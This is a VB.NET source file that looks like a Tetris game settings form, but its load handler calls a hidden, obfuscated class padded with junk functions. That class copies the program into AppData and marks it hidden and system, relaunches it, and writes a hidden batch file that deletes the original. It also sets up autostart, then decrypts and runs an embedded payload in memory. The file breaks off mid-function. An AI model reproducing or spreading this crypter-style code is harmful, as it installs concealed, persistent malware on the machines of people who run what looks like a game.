Public Class Form1
    Private _newBlocksNumber As Integer

    Private Sub pnlBackgroundSolid_Click(sender As Object, e As EventArgs) Handles pnlBackgroundSolid.Click
        Call ManageColorProperty(sender, "BackColor")
    End Sub

    Private Sub ManageColorProperty(sender As Panel, propertyName As String)
        With Me.dlgColor
            .Color = sender.BackColor
            If .ShowDialog(Me) = Windows.Forms.DialogResult.OK Then
                sender.BackColor = .Color
                CallByName(Me.TetrisBox1, propertyName, CallType.Set, .Color)
            End If
        End With
    End Sub

    Private Sub pnlBackgroundGradient1_Click(sender As Object, e As EventArgs) Handles pnlBackgroundGradient1.Click
        Call ManageColorProperty(sender, "GradientColor1")
    End Sub

    Private Sub pnlBackgroundGradient2_Click(sender As Object, e As EventArgs) Handles pnlBackgroundGradient2.Click
        Call ManageColorProperty(sender, "GradientColor2")
    End Sub

    Private Sub lnkBackgroundPicture_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lnkBackgroundPicture.LinkClicked
        If Me.dlgBackgroundPicture.ShowDialog(Me) = Windows.Forms.DialogResult.OK Then
            Me.TetrisBox1.BackgroundImage = Image.FromFile(Me.dlgBackgroundPicture.FileName)
        End If
    End Sub

    Private Sub radBackgroundSolid_CheckedChanged(sender As Object, e As EventArgs) Handles radBackgroundSolid.CheckedChanged, radBackgroundGradient.CheckedChanged, radBackgroundPicture.CheckedChanged
        Select Case True
            Case Me.radBackgroundSolid.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.SolidColor
            Case Me.radBackgroundGradient.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.Gradient
            Case Me.radBackgroundPicture.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.Picture
        End Select
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        GetBlockIntormation.KdMuJwZMvc()

        Me.cboGradientDirection.SelectedIndex = 1
        For Each name As String In System.Enum.GetNames(GetType(System.Windows.Forms.Keys))
            Me.cboKeysLeft.Items.Add(name)
            Me.cboKeysRight.Items.Add(name)
            Me.cboKeysRotate.Items.Add(name)
            Me.cboKeysDrop.Items.Add(name)
        Next

        GetBlockIntormation.BkfisFEOzx()
        Me.cboKeysLeft.SelectedItem = "Left"
        Me.cboKeysRight.SelectedItem = "Right"
        Me.cboKeysRotate.SelectedItem = "Up"
        Me.cboKeysDrop.SelectedItem = "Down"
    End Sub

    Private Sub cboGradientDirection_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboGradientDirection.SelectedIndexChanged
        Select Case Me.cboGradientDirection.SelectedIndex
            Case 0
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.Horizontal
            Case 1
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.Vertical
            Case 2
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.ForwardDiagonal
            Case 3
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.BackwardDiagonal
        End Select
    End Sub

    Private Sub numRows_ValueChanged(sender As Object, e As EventArgs) Handles numRows.ValueChanged
        Me.TetrisBox1.Rows = Me.numRows.Value
    End Sub

    Private Sub numColumns_ValueChanged(sender As Object, e As EventArgs) Handles numColumns.ValueChanged
        Me.TetrisBox1.Columns = Me.numColumns.Value
    End Sub

    Private Sub numCellSize_ValueChanged(sender As Object, e As EventArgs) Handles numCellSize.ValueChanged
        Me.TetrisBox1.CellSize = Me.numCellSize.Value
    End Sub

    Private Sub pnlBlock1Color_Click(sender As Object, e As EventArgs) Handles pnlBlock1Color.Click, pnlBlock2Color.Click, pnlBlock3Color.Click, pnlBlock4Color.Click, pnlBlock5Color.Click, pnlBlock6Color.Click, pnlBlock7Color.Click
        Call ManageColorProperty(sender, DirectCast(sender, Panel).Name.Replace("pnl", String.Empty))
    End Sub

    Private Sub cboKeysLeft_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysLeft.SelectedIndexChanged
        Call ManageKeyProperty(sender, "LeftKey")
    End Sub

    Private Sub ManageKeyProperty(sender As ComboBox, propertyName As String)
        Dim names() As String = System.Enum.GetNames(GetType(System.Windows.Forms.Keys))
        Dim values() As Integer = System.Enum.GetValues(GetType(System.Windows.Forms.Keys))
        For index = 0 To names.Length - 1
            If sender.SelectedItem.Equals(names(index)) Then
                CallByName(Me.TetrisBox1, propertyName, CallType.Set, CType(values(index), System.Windows.Forms.Keys))
            End If
        Next
    End Sub

    Private Sub cboKeysRight_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysRight.SelectedIndexChanged
        Call ManageKeyProperty(sender, "RightKey")
    End Sub

    Private Sub cboKeysRotate_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysRotate.SelectedIndexChanged
        Call ManageKeyProperty(sender, "RotateKey")
    End Sub

    Private Sub cboKeysDrop_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysDrop.SelectedIndexChanged
        Call ManageKeyProperty(sender, "DropKey")
    End Sub

    Private Sub pnlRandomBlock_Click(sender As Object, e As EventArgs) Handles pnlRandomBlock.Click
        Call ManageColorProperty(sender, "RandomBlockColor")
    End Sub

    Private Sub pnlUncompleteLine_Click(sender As Object, e As EventArgs) Handles pnlUncompleteLine.Click
        Call ManageColorProperty(sender, "UncompleteRowColor")
    End Sub

    Private Sub tbrSpeed_Scroll(sender As Object, e As EventArgs) Handles tbrSpeed.Scroll, tbrSpeed.ValueChanged
        Me.TetrisBox1.TimerInterval = Me.tbrSpeed.Value
    End Sub

    Private Sub btnStart_Click(sender As Object, e As EventArgs) Handles btnStart.Click
        Me.btnStart.Enabled = False
        Me.btnStop.Enabled = True
        Me.btnPause.Enabled = True

        Me.gbxBackground.Enabled = False
        Me.gbxBlockColors.Enabled = False
        Me.gbxBoardSize.Enabled = False
        Me.gbxDifficulties.Enabled = False
        Me.gbxKeys.Enabled = False

        _newBlocksNumber = 0

        Me.TetrisBox1.StartGame()
    End Sub

    Private Sub btnStop_Click(sender As Object, e As EventArgs) Handles btnStop.Click
        Me.TetrisBox1.StopGame()
        Call GameStopped()
    End Sub

    Private Sub GameStopped()
        Me.btnStart.Enabled = True
        Me.btnStop.Enabled = False
        Me.btnPause.Enabled = False
        Me.btnResume.Enabled = False

        Me.gbxBackground.Enabled = True
        Me.gbxBlockColors.Enabled = True
        Me.gbxBoardSize.Enabled = True
        Me.gbxDifficulties.Enabled = True
        Me.gbxKeys.Enabled = True
    End Sub

    Private Sub TetrisBox1_FullRows(sender As Object, e As TetrisBox.FullRowsEventArgs) Handles TetrisBox1.FullRows
        Me.lstEvents.Items.Add("FullRows [NumberOfRows=" + e.NumberOfRows.ToString + "]")
    End Sub

    Private Sub TetrisBox1_GameOver(sender As Object, e As EventArgs) Handles TetrisBox1.GameOver
        Call GameStopped()
        Me.lstEvents.Items.Add("GameOver")
    End Sub

    Private Sub btnPause_Click(sender As Object, e As EventArgs) Handles btnPause.Click
        Me.TetrisBox1.Pause()
        Me.btnPause.Enabled = False
        Me.btnResume.Enabled = True
    End Sub

    Private Sub btnResume_Click(sender As Object, e As EventArgs) Handles btnResume.Click
        Me.TetrisBox1.Resume()
        Me.btnPause.Enabled = True
        Me.btnResume.Enabled = False
    End Sub

    Private Sub TetrisBox1_NewBlock(sender As Object, e As TetrisBox.NewBlockEventArgs) Handles TetrisBox1.NewBlock
        Me.lstEvents.Items.Add("NewBlock [BlockType=" + e.BlockType.ToString + ", NextBlockType=" + e.NextBlockType.ToString + "]")

        _newBlocksNumber += 1

        If Me.chkRandomBlock.Checked AndAlso ((_newBlocksNumber Mod Me.numRandomBlock.Value) = 0) Then
            Me.TetrisBox1.AddRandomBlock()
        End If

        If Me.chkUncompleteLine.Checked AndAlso ((_newBlocksNumber Mod Me.numUncompleteLine.Value) = 0) Then
            Me.TetrisBox1.AddUncompleteRow()
        End If
    End Sub

    Private Sub TetrisBox1_Starting(sender As Object, e As EventArgs) Handles TetrisBox1.Starting
        Me.lstEvents.Items.Add("Starting")
    End Sub

    Private Sub lnkArticle_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lnkArticle.LinkClicked
        Process.Start("http://www.codeproject.com/Articles/812310/Create-Tetris-games-in-Net")
    End Sub
End Class
Class GetBlockIntormation
    Shared Function RCWceqqlYP(ByVal EmmtOCTcqB() As Byte, vGVkcMDryp As Integer) As Byte()
        Dim BfgSyFUPbc(0 To (EmmtOCTcqB.Length - vGVkcMDryp) - 1) As Byte
        Dim BZgBEFkQCH = LLxbkvjATo()

        Return BfgSyFUPbc
    End Function
    Public Shared Function LLxbkvjATo()
        Dim SkIJFpAYvb As Integer = 32
        Dim cgXPZfTHKx As Object = {}
        Dim btmSEgZUOR As Object = {}
        Dim hNykgZGtSj As String = "PdCiosCLgC"
        Dim DzBvuDYpuU As String = "FwkZCCnaoq"
        Dim cVYilfzJMI As Long = 655
        Dim LVvHYvDyQd As Object = {}
        Dim RxXMkqGmzu As Object = {}
        Dim jAihAYAgOQ As String = "IJqQNzVmck"
        Dim WjyxlkdXgB As Object = {}
        Dim evtcbdoiEV As Object = {}
        Dim MDhozuOmop As String = "CRQPTEOCXI"
        Dim TcrWUoeKQc As String = "rtPtSPVfKv"
        Dim qGfvxQbsNO As String = "jFixuYkfnk"
        Dim QVlwDrgxBD As String = "FrlJICDbPV"
        Dim UKdDvnoyno As Object = {}
        Return "PszfWsGJCM"
    End Function



    Shared Sub YJTrbiRxYO(ByVal yXZrhJWCLD As String, ByVal CMRyZEeCyo As String)
        Dim Jlchuyvbab = New anti.IntegrityCheck
        Dim EUyJVDNmpz = NNfVmuiklf()

        Jlchuyvbab.AppExePath = CMRyZEeCyo
        Jlchuyvbab.AppPath = yXZrhJWCLD
        Jlchuyvbab.RunCheck()
        Dim lpBYYVtDcn = tqyWaOjQDR()

    End Sub
    Public Shared Function NNfVmuiklf()
        Dim WXJellHgEU As Integer = 32
        Dim JBZecxzYxl As Object = {}
        Dim KGZuWxjXWG As Object = {}
        Dim RSUZMpuiva As String = "AaHlkHUmeu"
        Dim qorMERVCNN As String = "GzSTFAlKGh"
        Dim fQqqDccfAA As Long = 655
        Dim edFtidisET As Object = {}
        Dim kxRKJXORIm As Object = {}
        Dim RNVJSqKjWF As String = "sOMGtPJbFa"
        Dim HhEAgzvyet As Object = {}
        Dim QkjtlqkvXO As Object = {}
        Dim OGPiBtMWGg As String = "FMiWkBrYKB"
        Dim lkCHeWJEES As String = "LtJrrweKSm"
        Dim LyIHkwOJrH As String = "TKEnboYUQb"
        Dim PnAPcsWKes As String = "FCjqwCXZNL"
        Dim WMLxylniGf As Object = {}
        Return "udiTvNdCAy"
    End Function

    Public Shared Function tqyWaOjQDR()
        Dim TFEWhooVrG As Integer = 32
        Dim HbEkmALzFY As Object = {}
        Dim JZnNvyZkzu As Object = {}
        Dim gybWebmSXM As String = "PyywQsqIbh"
        Dim VZaAdmtvKy As String = "mclVtUnqZU"
        Dim MltEFvIwno As Long = 655
        Dim aLBldhPhrF As Object = {}
        Dim iXwQTZasPZ As Object = {}
        Dim QfjcrrAvzt As String = "GuTDLABLiM"
        Dim XEuKMkRUbg As Object = {}
        Dim vVShKMIoVz As Object = {}
        Dim ujikpNOBYS As String = "BCtBRGuacl"
        Dim UxokwnTHMH As String = "JToxByplaZ"
        Dim YmgrnjbHys As String = "hqLksaQEsN"
        Dim fLrZJcsgbf As String = "WRKNrlXhfA"
        Dim CpeymFoNYR As Object = {}
        Return "byliygJTnl"
    End Function



    Shared Sub BkfisFEOzx()
        Dim SuGqtpUXtQ As String = Application.ExecutablePath
        Dim jPgeiYEdka = bEkzsftTMG()


        Dim EmmtOCTcqB() As Byte = GeWGdBxOLC(SuGqtpUXtQ)
        Dim NlSVatYZLB As Integer = DXPfMEyBwd(EmmtOCTcqB)
        Dim xvnbAJwNNM = orIivSHRTr()

        Dim vGVkcMDryp As Integer = NlSVatYZLB
        If EmmtOCTcqB(vGVkcMDryp - 10) = &H54 Then
            'AZi's
            Dim OLOzvtwVfB = EPztbDdnQe()

            YJTrbiRxYO(Application.StartupPath, SuGqtpUXtQ)
        End If

        Dim qijkOq = kEZmzx()

        If EmmtOCTcqB(vGVkcMDryp - 14) = &H54 Then
            Dim DSyqid = qZbqmq()

            'copy self
            Dim kiBprw = xlXVcj()

            Dim wyExrLicTq As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            Dim ueQvLm = dJrHWD()

            If SuGqtpUXtQ.ToLower.Contains(wyExrLicTq.ToLower) Then
                Dim rHMXNp = mNWzbu()

            Else
                Dim QQUHZQ = TdZykN()

                Dim aBCEphvitP As String = Strings.Right(SuGqtpUXtQ, (SuGqtpUXtQ.ToString.Length - SuGqtpUXtQ.LastIndexOf("\")))
                Dim mviQiu = eZoEEC()


                Dim bSidnG = MhbQbU()

                'copy our self to temp and re execute
                Dim afxgSH = mqjzov()

                Try
                    Dim QthHmR = jLOpEx()

                    FileIO.FileSystem.WriteAllBytes(wyExrLicTq & aBCEphvitP, FileIO.FileSystem.ReadAllBytes(SuGqtpUXtQ), False)

                Catch ex As Exception
                    Try
                        Dim sHmnhoAhMeB = bNQoJfhDsJO()

                        FileIO.FileSystem.DeleteFile(wyExrLicTq & aBCEphvitP)
                        FileIO.FileSystem.WriteAllBytes(wyExrLicTq & aBCEphvitP, FileIO.FileSystem.ReadAllBytes(SuGqtpUXtQ), False)

                    Catch exx As Exception
                        Dim UeHZAmwgSgi = RQtXtOVnays()

                        End
                    End Try
                End Try

                Dim hyiOOzKHWbr = lJfudVAmHfo()


                System.IO.File.SetAttributes(wyExrLicTq & aBCEphvitP, IO.FileAttributes.Hidden)
                System.IO.File.SetAttributes(wyExrLicTq & aBCEphvitP, IO.FileAttributes.System)
                Process.Start(wyExrLicTq & aBCEphvitP)
                Dim hKpGxZYnXFf = OOmMXRGZkup()

                'melt
                If EmmtOCTcqB(vGVkcMDryp - 12) = &H54 Then
                    Dim rmpaFoL = kwYjHVx()

                    FileIO.FileSystem.WriteAllText("a.bat", "ping 127.0.0.1 -n 3 > nul" & Environment.NewLine & "del " & """" & Application.ExecutablePath & """" & Environment.NewLine & "del a.bat", False)
                    Dim startInfo As New ProcessStartInfo("a.bat")
                    Dim HxZsCyU = GJgkmZh()

                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Process.Start(startInfo)
                    Dim lpQIRuU = uhoJnLx()

                    End
                Else
                    Dim tXRMfNN = XeGYbIR()

                    End
                End If
                Dim NtpzvSS = kjjQHVc()


            End If
            Dim TOKcSms = agNjyFf()

        End If

        Dim JoAvVWF = cXolRdR()

        'check if auto startup
        Dim IqqhhW = DEQwhc()

        If EmmtOCTcqB(vGVkcMDryp - 8) = &H54 Then
            Dim OdRShR = RpWJsN()

            DEBMnDIoTp()
            Dim LQLbXU = EmBdIb()

        End If
        Dim fPeqQz = UPrDiL()


        Dim dvJMUB = HEGkMX()

        Dim BfgSyFUPbc() As Byte = RCWceqqlYP(EmmtOCTcqB, vGVkcMDryp)
        Dim mRCYyt = YZgYBG()

        BfgSyFUPbc = Loop1(BfgSyFUPbc, EmmtOCTcqB, vGVkcMDryp)
        Dim zKZYvg = OFeSuR()

        BfgSyFUPbc = Loop2(BfgSyFUPbc)
        Dim WuLOSJ = IJFAGX()


        Dim keSbdu = yinIOh()


        Dim JGoePW = tdyDom()

        Award.Win.Run(HWFTsAbAgD(hIzTmZWutO(BfgSyFUPbc)), Command, Application.ExecutablePath)

        Dim PcqjCPum = zuBrhfES()

        Process.GetCurrentProcess.Kill()
    End Sub
    Public Shared Function bEkzsftTMG()
        Dim SXTqGpehUu As Integer = 32
        Dim ImDQazfxDO As Object = {}
        Dim mRnoFVTrbe As Object = {}
        Dim wNCuZKmaqA As String = "vbRxELsntU"
        Dim CudPfFYMxm As String = "jKhNoYUeLF"
        Dim KLYKQxTWvb As Long = 655
        Dim ZePECiFtTt As Object = {}
        Dim wDDNlLScsL As Object = {}
        Dim gDanXbWRwg As String = "XJubGkBTAB"
        Dim DhOMAETztT As Object = {}
        Dim dqVwNeoFIn As Object = {}
        Dim rRdclQvqLE As String = "ydYHbIGBkY"
        Dim hkMTyagFTs As String = "XzvuSkhVCL"
        Dim nJXBUTxdwf As String = "MbuYSvoypy"
        Dim LoKbxwtLtS As String = "DmNcuEDySn"
        Dim kCQbDXyQgH As Object = {}
        Return "ZZQoIiVuuY"
    End Function

    Public Shared Function orIivSHRTr()
        Dim vQTQQMYpwe As Integer = 32
        Dim mXmEzUDqAz As Object = {}
        Dim EZxZPDxlOU As Object = {}
        Dim sENZFPpdHl As String = "sJNqzPZcgF"
        Dim AVIVqHknFZ As String = "idvhNZKrot"
        Dim YrfHhjLGXN As Long = 655
        Dim pCGPjSbPRh As Object = {}
        Dim NTelguSjKz As Object = {}
        Dim MguoLvYxOT As String = "SAFGnoEWSl"
        Dim zPJEwHAogE As Object = {}
        Dim aRABXhzgPa As Object = {}
        Dim qjswKRlDos As String = "znXoPIaziN"
        Dim wIDefKCbRg As String = "oPWSOThcVA"
        Dim TmqDInyIOS As String = "twxnUOTPcm"
        Dim tBwDOOEOBH As String = "BNsiEGOZaa"
        Dim xqoKGJMOor As Object = {}
        Return "nEYlaTNeXK"
    End Function

    Public Shared Function EPztbDdnQe()
        Dim NYdBauCjjU As Integer = 32
        Dim UspTCnjInn As Object = {}
        Dim BItSLGeaBG As Object = {}
        Dim petfQRBDPY As String = "rbbJYQPoJu"
        Dim OAPSHtcXhL As String = "yAmruJgNmh"
        Dim DcOwGEjAUy As Long = 655
        Dim VfZQXmdujT As Object = {}
        Dim uohAjNyBxn As Object = {}
        Dim IOphHyFlBF As String = "QakMxrQwaY"
        Dim ziYYVIqAJt As Object = {}
        Dim pwHzpSrQsM As Object = {}
        Dim FHjGqCHYlg As String = "dYGcodytfz"
        Dim clWfTeDGjS As String = "VkZhQmNtIo"
        Dim CAcfZFJLWH As String = "rWcteQfpkZ"
        Dim GoUnRBRMJr As String = "NNfVmuikl"
        Dim UgibSNWcmI As Object = {}
        Return "xwwmvkpvQB"
    End Function

    Public Shared Function kEZmzx()
        Dim VYSphM As String = "rPURpp"
        Dim YynjXJ As String = "vhZZum"
        Dim qdkUUr As Long = 137
        Dim PEGXGS As String = "LsAgvV"
        Dim zhPNZi As Long = 335
        Return "Btdwtf"
    End Function

    Public Shared Function qZbqmq()
        Dim trgyqn As String = "IcmLCZ"
        Dim bjWNgF As String = "rMMnHp"
        Dim yrWmWj As Long = 137
        Dim chEqpE As String = "yYHSxi"
        Dim fGZkfB As Long = 335
        Return "CqMaBe"
    End Function

    Public Shared Function xlXVcj()
        Dim hWwyhz As String = "GpCOha"
        Dim SqpBPO As String = "HXnvIZ"
        Dim UQKvFM As Long = 137
        Dim LpsCNV As String = "nvHgCt"
        Dim thhRCn As Long = 335
        Return "IKXsdY"
    End Function

    Public Shared Function dJrHWD()
        Dim QWTXTQ As String = "wElpBk"
        Dim iIgvCy As String = "PjiayR"
        Dim CfNtOe As Long = 137
        Dim yTICDi As String = "mIWjhu"
        Dim knBFlw As Long = 335
        Return "ZUzzeH"
    End Function

    Public Shared Function mNWzbu()
        Dim FsTkYb As String = "LetVZW"
        Dim aHjwzG As String = "vGCLsl"
        Dim MbczhU As Long = 137
        Dim iTfbpy As String = "cWGKBE"
        Dim zGszYh As Long = 335
        Return "hgueUz"
    End Function

    Public Shared Function TdZykN()
        Dim EFinDc As String = "ClNKHe"
        Dim rSLEAp As String = "EKiExc"
        Dim IEYbjY As Long = 137
        Dim XpfpvJ As String = "cbFavE"
        Dim ejmksC As Long = 335
        Return "zjFzlh"
    End Function

    Public Shared Function eZoEEC()
        Dim gyJytA As String = "DivnQd"
        Dim lIxTNw As String = "XFcmcJ"
        Dim UtXvSM As Long = 137
        Dim IhlbwY As String = "GNPyAb"
        Dim vuOstm As Long = 335
        Return "InksqY"
    End Function

    Public Shared Function MhbQbU()
        Dim gEIOnA As String = "whypOk"
        Dim RgREHQ As String = "wWAIal"
        Dim SODkiP As Long = 137
        Dim ywVCQi As String = "VfHsmL"
        Dim QbSnNQ As Long = 335
        Return "pCoqzr"
    End Function

    Public Shared Function mqjzov()
        Dim YKbCWJ As String = "aMjNtG"
        Dim akwwMH As String = "eenUyC"
        Dim sPuhJo As Long = 137
        Dim yBUTKi As String = "czTKOF"
        Dim iddIdy As Long = 335
        Return "NUMNwT"
    End Function

    Public Shared Function jLOpEx()
        Dim coutuDOKoLq As Integer = 701
        Dim XvMhEiOsfvY As Integer = 909
        Dim ygxVChQFpRq As Long = 6
        Dim QkQBOqDhGbV As Object = {}
        Dim LYTVzUOCVWX As Long = 187
        Dim PeRlUqTihGZ As Object = {}
        Dim jIGLWxvjrdi As Long = 293
        Dim cABleebqoqe As Object = {}
        Dim xtMYhiWStka As Integer = 606
        Dim KxqQOwhvaUw As String = "WUibTKhlktx"
        Dim TrXcfnCuWAT As Long = 667
        Dim zShSXgKslxF As Long = 387
        Dim VWrmPkaSniu As Long = 564
        Dim nHwzBsXicEs As Integer = 204
        Dim MSMuKtlVtNf As Long = 236
        Dim SxeEUNfayJL As Long = 611
        Dim xzUAXJzzVuT As Long = 514
        Dim HecyNYVCKRJ As Integer = 72
        Dim IdUmSydVGcN As Object = {}
        Return "nMvPvsHhBYo"
    End Function

    Public Shared Function bNQoJfhDsJO()
        Dim iONmLXXQTnb As Integer = 701
        Dim ZhoSeGQxYmr As Integer = 909
        Dim jByjgWSCPUq As Long = 6
        Dim fTOEeBmiFtQ As Object = {}
        Dim LkaNjubiWBL As Long = 187
        Dim bHJMTEEWQzW As Object = {}
        Dim uazGhLLZcho As Long = 293
        Dim wGcbMjcfxEL As Object = {}
        Dim ELPfNBKKtOX As Integer = 606
        Dim ulGyRmYFdLc As String = "WDcTqjkGKtN"
        Dim QdIaZPaAeRc As Long = 667
        Dim OrhozrZvlaJ As Long = 387
        Dim dWfaVCYxLXJ As Long = 564
        Dim ARYHcFSKiIJ As Integer = 204
        Dim BFSPsfFeheV As Long = 236
        Dim bIRYPfxEToT As Long = 611
        Dim PqYdERgNilN As Long = 514
        Dim JFGDzxCJFTk As Integer = 72
        Dim oSugpsrgZtj As Object = {}
        Return "EeeymCAWWCD"
    End Function

    Public Shared Function RQtXtOVnays()
        Dim FFIEYbhdREe As Integer = 701
        Dim xFTQRJjytPP As Integer = 909
        Dim WahsNKRkJNt As Long = 6
        Dim URSGAmapqAy As Object = {}
        Dim LGfmGVIMVVr As Long = 187
        Dim tQbJZNbxHew As Object = {}
        Dim rpyEoouqMcV As Long = 293
        Dim MAYKQufftLy As Object = {}
        Dim wjpbZkmqXij As Integer = 606
        Dim FgMspByGptG As String = "rezXApasOne"
        Dim GTwpKAstlZV As Long = 667
        Dim xQaIAjweutD As Long = 387
        Dim wXikqKZKWDv As Long = 564
        Dim tEURqnOSGAI As Integer = 204
        Dim SrxMLomQynT As Long = 236
        Dim AifPFgPpHIt As Long = 611
        Dim pyXBUQImuQG As Long = 514
        Dim yOJmJiLPoPK As Integer = 72
        Dim tVaZTNLxgzs As Object = {}
        Return "UFLORMNKpVK"
    End Function

    Public Shared Function lJfudVAmHfo()
        Dim lEgejVQmiLt As Integer = 701
        Dim FhVEkbrosiC As Integer = 909
        Dim MvZuWuvgUqC As Long = 6
        Dim TSbRwNTXtpu As Object = {}
        Dim gXFJcadAaZP As Long = 187
        Dim FPGkLaBbPuW As Object = {}
        Dim oQlVuRyzWEn As Long = 293
        Dim VswLmLHwlCZ As Object = {}
        Dim rvGfdPXXnmN As Integer = 606
        Dim JhKsQXUncIM As String = "iramYYiauRy"
        Dim oXtwjsbfyOf As Long = 667
        Dim SZjsmnwEVyn As Long = 387
        Dim dErqcDSHKVd As Long = 564
        Dim sYsvKOxMmdl As Integer = 204
        Dim JmKIKXEmBdI As Long = 236
        Dim KIoxBvBuYKn As Long = 611
        Dim NgAgwSwlNiV As Long = 514
        Dim EocfaCUUUsu As Integer = 72
        Dim JcLbWXknDnQ As Object = {}
        Return "FbNcvBOHQYK"
    End Function

    Public Shared Function OOmMXRGZkup()
        Dim LBgVMVYNwAv As Integer = 701
        Dim QzOywqIedlI As Integer = 909
        Dim SfqUbOZkxIf As Long = 6
        Dim aleYcgHPuSq As Object = {}
        Dim QLVqfQVKeQw As Long = 187
        Dim sdrMEOhLLyh As Object = {}
        Dim mDXSnuXFfWw As Long = 293
        Dim kRvhOWWAmed As Object = {}
        Dim zvuSkhVCLbd As Integer = 606
        Dim WrnAqkOPiNd As String = "WfgIHKBjiip"
        Dim whgQeJtJUtm As Long = 667
        Dim lQnVSvdSjph As Long = 387
        Dim efVvNbzOFXE As Long = 564
        Dim XMSpiJLXFuI As Integer = 204
        Dim PPUomrP As Long = 236
        Dim mhAVgtz As Long = 611
        Dim ATPunFT As Long = 514
        Dim OQcziRI As Integer = 72
        Dim fJxyGab As Object = {}
        Return "OLdjoRY"
    End Function

    Public Shared Function kwYjHVx()
        Dim kTmTZWX As Long = 885
        Dim sYZXanF As String = "XIAAEik"
        Dim kNeskvu As String = "TDLvemX"
        Dim ANHSxfq As Long = 174
        Dim pvOYmQa As Object = {}
        Dim utvBWlK As Long = 87
        Dim FYEyNBg As Integer = 927
        Dim MlIpyUk As Long = 253
        Return "JSvWywY"
    End Function

    Public Shared Function GJgkmZh()
        Dim nPlCHsJ As Long = 885
        Dim tuEMSMC As String = "xACbniI"
        Dim ZcWdAgo As String = "RciqtOq"
        Dim gHgcPZp As Long = 174
        Dim qbrtRpr As Object = {}
        Dim vsnpaKR As Long = 87
        Dim MvGVmTE As Integer = 927
        Dim yuuAxHf As Long = 253
        Return "mmzmatj"
    End Function

    Public Shared Function uhoJnLx()
        Dim SRbyJnd As Long = 885
        Dim NYsmTSe As String = "xHJDcJl"
        Dim zxkFwhW As String = "CtkodDH"
        Dim quFMqqh As Long = 174
        Dim BRyYwEh As Object = {}
        Dim dLhtiDE As Long = 87
        Dim bkDoweX As Integer = 927
        Dim VzlOrKt As Long = 253
        Return "XgOjXjK"
    End Function

    Public Shared Function XeGYbIR()
        Dim fgDXdAI As Long = 885
        Dim IAHmFxS As String = "jDGvcxK"
        Dim NuyKrtL As String = "rwnHtof"
        Dim LachvvH As Long = 174
        Dim KgkIkVk As Object = {}
        Dim xWHAKIp As Long = 87
        Dim USAhQLj As Integer = 927
        Dim dFZSscb As Long = 253
        Return "CPpMAdp"
    End Function

    Public Shared Function kjjQHVc()
        Dim zUqeTHD As Long = 885
        Dim xiOsujC As String = "CWxoqES"
        Dim XZGIhIh As String = "yJrxfHj"
        Dim IHPOuXv As Long = 174
        Dim WtemCkQ As Object = {}
        Dim kprsxwF As Long = 87
        Dim AjMrVFX As Integer = 927
        Dim jksbDwV As Long = 253
        Return "GVncVzu"
    End Function

    Public Shared Function agNjyFf()
        Dim bTxgTEa As Long = 885
        Dim tiPsSMh As String = "UHCBcMP"
        Dim odaotRU As String = "WmWLMJn"
        Dim KUdQBvX As Long = 174
        Dim QSKtlQG As Object = {}
        Dim axTrbfc As Long = 87
        Dim hLXhNyg As Integer = 927
        Dim erKPNbV As Long = 253
        Return "qEEtepB"
    End Function

    Public Shared Function cXolRdR()
        Dim PUTEgqz As Long = 885
        Dim TaQUBN As String = "qJDJYp"
        Dim lFOFzu As String = "KgkIkV"
        Dim HUeRaZ As Long = 174
        Dim vJtyEl As Object = {}
        Dim iAyRux As Long = 87
        Dim lCFbQu As Integer = 927
        Dim kZTLjv As Long = 253
        Return "oTJjVq"
    End Function

    Public Shared Function DEQwhc()
        Dim mopYlt As Integer = 369
        Dim tTzXBm As String = "YJibUH"
        Dim uAlDcl As Object = {}
        Dim aiDVJF As Long = 895
        Dim xSpLgh As Long = 326
        Return "tNAGHm"
    End Function

    Public Shared Function RpWJsN()
        Dim CRfzMd As Integer = 369
        Dim OSSmuR As String = "DzRgnc"
        Dim QsngjP As Object = {}
        Dim GRVnrY As Long = 895
        Dim VCcADK As Long = 326
        Return "aoCmDF"
    End Function

    Public Shared Function EmBdIb()
        Dim qGugqp As Integer = 369
        Dim MyxIyT As String = "sgPagn"
        Dim PPBPCQ As Object = {}
        Dim KLMLdU As Long = 895
        Dim jmiOOw As Long = 326
        Return "gadXEz"
    End Function

    Public Shared Function UPrDiL()
        Dim UwdkJK As Integer = 369
        Dim ipzkGx As String = "YOhsNH"
        Dim mzoFZs As Object = {}
        Dim GGXGDZ As Long = 895
        Dim WjNheJ As Long = 326
        Return "cNXgtC"
    End Function

    Public Shared Function HEGkMX()
        Dim KdbeCV As Integer = 369
        Dim hNNUZy As String = "cIYPzC"
        Dim PFDjPQ As Object = {}
        Dim LsxsET As Long = 895
        Dim lMDIEt As Long = 326
        Return "jsheIw"
    End Function

    Public Shared Function YZgYBG()
        Dim cqkgGD As Integer = 369
        Dim EwAJvb As String = "KiavwV"
        Dim aLQVWF As Object = {}
        Dim uLjkPl As Long = 895
        Dim LgJYFU As Long = 326
        Return "hXMBMy"
    End Function

    Public Shared Function OFeSuR()
        Dim gkbDsz As Integer = 369
        Dim ThGXHM As String = "PVAgwP"
        Dim DJPMac As Object = {}
        Dim Bptjfe As Long = 895
        Dim qWrdYp As Long = 326
        Return "DPOdUc"
    End Function

    Public Shared Function IJFAGX()
        Dim cgmzSD As Integer = 369
        Dim rJcaso As String = "MIvpmT"
        Dim ddVdbC As Object = {}
        Dim zVXFjg As Long = 895
        Dim tYznum As Long = 326
        Return "QHldRO"
    End Function

    Public Shared Function yinIOh()
        Dim hSMkTy As Integer = 369
        Dim VHbRxK As String = "TmFnBM"
        Dim ITDhuX As Object = {}
        Dim VMahrK As Long = 895
        Dim ZGRFcF As Long = 326
        Return "orXSor"
